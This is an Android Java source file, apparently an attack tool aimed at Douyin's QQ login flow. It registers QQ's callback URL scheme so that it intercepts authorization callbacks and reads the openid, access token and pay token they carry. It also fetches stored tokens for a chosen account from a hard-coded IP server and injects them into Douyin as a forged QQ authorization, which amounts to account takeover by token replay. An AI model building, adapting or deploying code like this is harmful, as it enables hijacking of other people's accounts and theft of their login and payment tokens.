package com.test.douyin;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "http://45.10.175.247:3260";

    private EditText etAccount;
    private Button btnAuth;
    private TextView tvResult;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etAccount = findViewById(R.id.etAccount);
        btnAuth = findViewById(R.id.btnAuth);
        tvResult = findViewById(R.id.tvResult);

        btnAuth.setOnClickListener(v -> doAuth());

        // 处理外部传入的 Intent
        handleIncomingIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleIncomingIntent(intent);
    }

    // ===== 接收外部跳转 (抖音通过 tencent1105602870:// 调用) =====
    private void handleIncomingIntent(Intent intent) {
        if (intent == null || intent.getData() == null) return;

        Uri data = intent.getData();
        String scheme = data.getScheme();

        if ("tencent1105602870".equals(scheme)) {
            // 来自抖音/其他应用的授权回调
            String fullUri = data.toString();
            String pasteboard = data.getQueryParameter("pasteboard");
            String objectlocation = data.getQueryParameter("objectlocation");

            StringBuilder sb = new StringBuilder();
            sb.append("收到外部回调\n");
            sb.append("来源: ").append(intent.getStringExtra(Intent.EXTRA_REFERRER_NAME) != null ?
                    intent.getStringExtra(Intent.EXTRA_REFERRER_NAME) : "未知").append("\n");
            sb.append("完整URI: ").append(fullUri).append("\n");
            if (pasteboard != null) {
                sb.append("Pasteboard: ").append(pasteboard).append("\n");
                // 尝试解析 pasteboard 数据 (openid|access_token|pay_token)
                try {
                    String decoded = java.net.URLDecoder.decode(pasteboard, "UTF-8");
                    String[] parts = decoded.split("\\|");
                    if (parts.length >= 3) {
                        sb.append("OpenID: ").append(parts[0]).append("\n");
                        sb.append("Token: ").append(parts[1]).append("\n");
                    }
                } catch (Exception ignored) {}
            }
            if (objectlocation != null) {
                sb.append("ObjectLocation: ").append(objectlocation);
            }

            showResult(sb.toString(), false);
        }
    }

    // ===== 从服务器获取数据并授权 =====
    private void doAuth() {
        String account = etAccount.getText().toString().trim();
        if (account.isEmpty()) {
            Toast.makeText(this, "请输入账号", Toast.LENGTH_SHORT).show();
            return;
        }

        btnAuth.setEnabled(false);
        btnAuth.setText("请求中...");
        tvResult.setVisibility(View.GONE);

        executor.execute(() -> {
            try {
                String urlStr = SERVER_URL + "/getOP/account=" + Uri.encode(account);
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);

                int code = conn.getResponseCode();
                if (code != 200) {
                    showError("服务器返回: " + code + (code == 404 ? " (账号不存在)" : ""));
                    return;
                }

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                conn.disconnect();

                String response = sb.toString().trim();
                if (response.isEmpty()) {
                    showError("返回数据为空");
                    return;
                }

                String[] parts = response.split("----");
                if (parts.length < 2) {
                    showError("数据格式错误:\n" + response);
                    return;
                }

                String accountId = parts[0];
                String dataPart = parts[1];
                String[] fields = dataPart.split("\\|");
                if (fields.length < 3) {
                    showError("数据字段不足:\n" + response);
                    return;
                }

                String openid = fields[0];
                String accessToken = fields[1];
                String payToken = fields[2];

                StringBuilder resultText = new StringBuilder();
                resultText.append("✓ 获取成功\n");
                resultText.append("账号: ").append(accountId).append("\n");
                resultText.append("OpenID: ").append(openid).append("\n");
                resultText.append("Token: ").append(accessToken).append("\n\n");
                resultText.append("正在尝试唤起 QQ 授权...");

                showResult(resultText.toString(), false);

                // 使用 tencent1105602870:// URL Scheme 唤起 QQ 授权
                // 由于本 APK 注册了相同 Scheme，会弹窗让用户选择
                String callbackUrl = "tencent1105602870://qzapp/mqzone/0"
                        + "?objectlocation=url"
                        + "&pasteboard=" + Uri.encode(openid + "|" + accessToken + "|" + payToken);

                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(callbackUrl));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(Intent.createChooser(intent, "选择应用处理授权"));

            } catch (Exception e) {
                showError("错误:\n" + e.getMessage());
            }
        });
    }

    private void showError(final String msg) {
        mainHandler.post(() -> {
            btnAuth.setEnabled(true);
            btnAuth.setText("授权登录");
            showResult(msg, true);
        });
    }

    private void showResult(final String msg, final boolean isError) {
        mainHandler.post(() -> {
            btnAuth.setEnabled(true);
            btnAuth.setText("授权登录");
            tvResult.setVisibility(View.VISIBLE);
            tvResult.setTextColor(isError ? 0xFFE53E3E : 0xFF333333);
            tvResult.setText(msg);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executor.shutdown();
    }
}
